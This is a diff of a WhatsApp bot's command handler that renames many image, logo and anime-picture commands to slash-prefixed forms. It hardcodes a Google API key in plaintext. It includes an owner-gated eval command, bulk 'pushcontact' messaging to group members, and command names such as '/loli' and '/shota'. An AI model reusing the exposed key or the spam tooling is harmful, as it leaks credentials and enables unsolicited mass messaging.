 client.sendMessage(from, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
 }
 break
-case 'pornhub':{
-if(!q) return replygcZero(`Example: ${prefix + command} ajg | ea`)
+case '/pornhub':{
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
 ZeroStickWait()
   inilogo4 = args.join(" ")
 inilogo9 = args.join(" ")
@@ -4436,8 +4437,8 @@ console.log(anuphub)
 client.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
 }
 break
-case 'retro':{
-if(!q) return replygcZero(`Example: ${prefix + command} ajg | ea`)
+case '/retro':{
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
 ZeroStickWait()
   inilogo4 = args.join(" ")
 inilogo9 = args.join(" ")
@@ -4448,8 +4449,8 @@ console.log(anutro2)
 client.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
 }
 break
-case '8bit':{
-if(!q) return replygcZero(`Example: ${prefix + command} ajg | ea`)
+case '/8bit':{
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
 ZeroStickWait()
   inilogo4 = args.join(" ")
 inilogo9 = args.join(" ")
@@ -4460,48 +4461,48 @@ console.log(anubit8)
 client.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
 }
 break
-case 'batman':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/batman':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err))
    break
-case '3dbox':
-if(!q) return replygcZero(`Example: ${prefix + command} ea`)
+case '/3dbox':
+if(!q) return replygcZero(`Example: ${prefixo + command} ea`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
     `${q}`,])
 .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break
-case 'lion':
-  if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/lion':
+  if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
   maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
       `${q}`,])
      .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
      .catch((err) => console.log(err));
      break
-case '3davengers':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/3davengers':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break 
-case 'window':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/window':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case '3dspace':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg | ea`)
+case '/3dspace':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg | ea`)
 ZeroStickWait()
 teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
@@ -4510,219 +4511,219 @@ maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", 
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'bokeh':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/bokeh':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'holographic':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/holographic':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'thewall':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/thewall':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break 
-case 'carbon':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/carbon':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'whitebear':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/whitebear':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'metallic':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/metallic':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'steel':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/steel':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'fabric':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/fabric':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'ancient':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/ancient':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'marvel':
-if(!q) return replygcZero(`Example: ${prefix + command} ajg`)
+case '/marvel':
+if(!q) return replygcZero(`Example: ${prefixo + command} ajg`)
 ZeroStickWait()
 maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
     `${q}`,])
   .then((data) => client.sendMessage(from, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
-case 'aesthetic':
+case '/aesthetic':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'antiwork':
+case '/antiwork':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'blackpink':
+case '/blackpink':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'bike':
+case '/bike':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'boneka':
+case '/boneka':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'cosplay':
+case '/cosplay':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'cat':
+case '/cat':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'doggo':
+case '/doggo':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'justina':
+case '/justina':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'kayes':
+case '/kayes':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'kpop':
+case '/kpop':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'notnot':
+case '/notnot':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'car':
+case '/car':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'couplepic':case 'couplepicture':
+case '/couplepic':case '/couplepicture':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'profilepic':  case 'profilepicture':
+case '/profilepic':  case '/profilepicture':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'pubg':
+case '/pubg':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'rose':
+case '/rose':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'ryujin':
+case '/ryujin':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'ulzzangboy':
+case '/ulzzangboy':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'ulzzanggirl':
+case '/ulzzanggirl':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'wallml': case 'wallpaperml':case 'mobilelegend':
+case '/wallml': case '/wallpaperml':case '/mobilelegend':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'wallpaperphone': case 'wallphone':
+case '/wallpaperphone': case '/wallphone':
 ZeroStickWait()
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
 var hasil = pickRandom(notnot)
 client.sendMessage(from, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
-case 'animewallpaper2': case 'animewall2': {
+case '/animewallpaper2': case '/animewall2': {
                 if (!args.join(" ")) return replygcZero("What wallpaper are you looking for??")
 		let { wallpaper } = require('./lib/scraperW')
                 anu = await wallpaper(args)
@@ -4730,7 +4731,7 @@ case 'animewallpaper2': case 'animewall2': {
                 client.sendMessage(from, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
             }
             break
-case 'animewall': case 'animewallpaper':
+case '/animewall': case '/animewallpaper':
 const { AnimeWallpaper } =require("anime-wallpaper")
 if(!q) return replygcZero('What wallpaper do you want?')
 ZeroStickWait()
@@ -4746,7 +4747,7 @@ const i = Math.floor(Math.random() * wallpaper.length)
                 })
 //client.sendMessage(from,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
 break
-case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
+case '/akira': case '/akiyama': case '/ana': case '/art': case '/asuna': case '/ayuzawa': case '/boruto': case '/bts': case '/chiho': case '/chitoge': case '/cosplay': case '/cosplayloli': case '/cosplaysagiri': case '/cyber': case '/deidara': case '/doraemon': case '/elaina': case '/emilia': case '/erza': case '/exo':  case '/gamewallpaper': case '/gremory': case '/hacker': case '/hestia': case '/hinata': case '/husbu': case '/inori': case '/islamic': case '/isuzu': case '/itachi': case '/itori': case '/jennie': case '/jiso': case '/justina': case '/kaga': case '/kagura': case '/kakasih': case '/kaori': case '/cartoon': case '/shortquote': case '/keneki': case '/kotori': case '/kurumi': case '/lisa': case '/loli': case '/madara': case '/megumin': case '/mikasa': case '/mikey': case '/miku': case '/minato': case '/mountain': case '/naruto': case '/neko': case '/neko2': case '/nekonime': case '/nezuko': case '/onepiece': case '/pentol': case '/pokemon': case '/programming':  case '/randomnime': case '/randomnime2': case '/rize': case '/rose': case '/sagiri': case '/sakura': case '/sasuke': case '/satanic': case '/shina': case '/shinka': case '/shinomiya': case '/shizuka': case '/shota': case '/space': case '/technology': case '/tejina': case '/toukachan': case '/tsunade': case '/waifu': case '/yotsuba': case '/yuki': case '/yulibocil': case '/yumeko':{
 
 ZeroStickWait()
 let heyy
@@ -4855,8 +4856,8 @@ let yeha = heyy[Math.floor(Math.random() * heyy.length)]
 client.sendMessage(from, { image: { url: yeha }, caption : mess.success }, { quoted: m })
 }
 break
-case '>':
-case '=>':
+case '/>':
+case '/=>':
 if (!ZeroTheCreator) return ZeroStickOwner()
 var err = new TypeError
 err.name = "EvalError "
@@ -4878,7 +4879,7 @@ if (err) _syntax = err + "\n\n"
 replygcZero(util.format(_syntax + _err))
 }
 break
-case 'pushcontact': {
+case '/pushcontact': {
     if (!ZeroTheCreator) return ZeroStickOwner()
       if (!m.isGroup) return replygcZero(`The feature works only in grup`)
     if (!text) return replygcZero(`text?`)
@@ -4890,9 +4891,9 @@ case 'pushcontact': {
      replygcZero(`Done`)
       }
       break
-case "pushcontactv2":{
+case "/pushcontactv2":{
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!q) return replygcZero(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
+if (!q) return replygcZero(`Incorrect Usage Please Use Command Like This\n${prefixo+command} idgc|text`)
 ZeroStickWait()
 const metadata2 = await client.groupMetadata(q.split("|")[0])
 const halss = metadata2.participants
@@ -4904,11 +4905,11 @@ replygcZero(`Success`)
 }
 break
 
-            case 'id':{
+            case '/id':{
             replygcZero(from)
            }
           break
-          case 'userjid':{
+          case '/userjid':{
           	if(!ZeroTheCreator) return ZeroStickOwner()
         const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : ""
 		const participants = m.isGroup ? await groupMetadata.participants : ""
@@ -4919,10 +4920,10 @@ break
       replygcZero(textt)
     }
     break
-          case 'emojimix': {
+          case '/emojimix': {
 		let [emoji1, emoji2] = text.split`+`
-		if (!emoji1) return replygcZero(`Example : ${prefix + command} 😅+🤔`)
-		if (!emoji2) return replygcZero(`Example : ${prefix + command} 😅+🤔`)
+		if (!emoji1) return replygcZero(`Example : ${prefixo + command} 😅+🤔`)
+		if (!emoji2) return replygcZero(`Example : ${prefixo + command} 😅+🤔`)
 		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
 		for (let res of anumojimix.results) {
 		    let encmedia = await client.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
@@ -4931,7 +4932,7 @@ break
 	    }
 	    break
 	
-case 'animeawoo':{
+case '/animeawoo':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4939,7 +4940,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animemegumin':{
+case '/animemegumin':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4947,7 +4948,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animeshinobu':{
+case '/animeshinobu':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4955,7 +4956,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animehandhold':{
+case '/animehandhold':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4963,7 +4964,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animehighfive':{
+case '/animehighfive':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4971,7 +4972,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animecringe':{
+case '/animecringe':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4979,7 +4980,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animedance':{
+case '/animedance':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4987,7 +4988,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animehappy':{
+case '/animehappy':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -4995,7 +4996,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animeglomp':{
+case '/animeglomp':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5003,7 +5004,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animesmug':{
+case '/animesmug':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5011,7 +5012,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animeblush':{
+case '/animeblush':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5019,7 +5020,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animewave':{
+case '/animewave':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5027,7 +5028,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animesmile':{
+case '/animesmile':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5035,7 +5036,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animepoke':{
+case '/animepoke':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5043,7 +5044,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animewink':{
+case '/animewink':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5051,7 +5052,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animebonk':{
+case '/animebonk':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5059,7 +5060,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animebully':{
+case '/animebully':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5067,7 +5068,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animeyeet':{
+case '/animeyeet':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5075,7 +5076,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animebite':{
+case '/animebite':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5083,7 +5084,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animelick':{
+case '/animelick':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5091,7 +5092,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animekill':{
+case '/animekill':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5099,7 +5100,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animecry':{
+case '/animecry':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5107,7 +5108,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animewlp':{
+case '/animewlp':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5115,7 +5116,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animekiss':{
+case '/animekiss':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5123,7 +5124,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animehug':{
+case '/animehug':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5131,7 +5132,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animeneko':{
+case '/animeneko':{
 ZeroStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5139,7 +5140,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animepat':{
+case '/animepat':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5147,7 +5148,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animeslap':{
+case '/animeslap':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5155,7 +5156,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animecuddle':{
+case '/animecuddle':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5163,7 +5164,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animewaifu':{
+case '/animewaifu':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5171,7 +5172,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animenom':{
+case '/animenom':{
 ZeroStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
             await client.sendMessage(from, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
@@ -5179,7 +5180,7 @@ ZeroStickWait()
                 })
                 }
 break
-case 'animefoxgirl':{
+case '/animefoxgirl':{
 ZeroStickWait()
